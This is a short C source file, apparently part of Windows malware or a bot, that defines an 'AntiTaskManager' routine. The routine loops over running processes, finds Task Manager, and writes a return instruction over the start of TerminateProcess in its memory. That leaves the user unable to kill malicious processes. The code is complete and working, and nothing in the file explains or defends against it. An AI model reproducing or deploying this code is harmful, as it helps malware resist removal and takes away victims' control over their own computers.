#include <windows.h> 
#include <tlhelp32.h> 
#include <stdio.h> 
#include "includes.h"
#include "extern.h"

void AntiTaskManager( void* pVoid ) 
{ 
   PROCESSENTRY32 pe32; 
   HANDLE hProcess, hTask; 
   unsigned long aTerminateProcess = (unsigned long)GetProcAddress( GetModuleHandle( "KERNEL32.DLL" ), "TerminateProcess" ); 
   unsigned char Retn = 0xC3; 
  
   pe32.dwSize = sizeof( PROCESSENTRY32 ); 
  
   while( true ) 
   { 
      hProcess = CreateToolhelp32Snapshot( 2, 0 ); 
  
      Process32First( hProcess, &pe32 ); 
  
      while( Process32Next( hProcess, &pe32 ) ) 
      { 
         if( !stricmp( pe32.szExeFile, "TASKMGR.EXE" ) ) 
         { 
            hTask = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID ); 
  
         if( hTask == NULL ) 
            break; 
  
         if( !WriteProcessMemory( hTask, (void *)aTerminateProcess, &Retn, 1, 0 ) ) 
            break; 
  
                        CloseHandle( hTask ); 
         } 
      } 
  
      CloseHandle( hProcess ); 
      Sleep( 100 ); 
   } 
  
   CloseHandle( hTask ); 
   CloseHandle( hProcess ); 
  
}; 
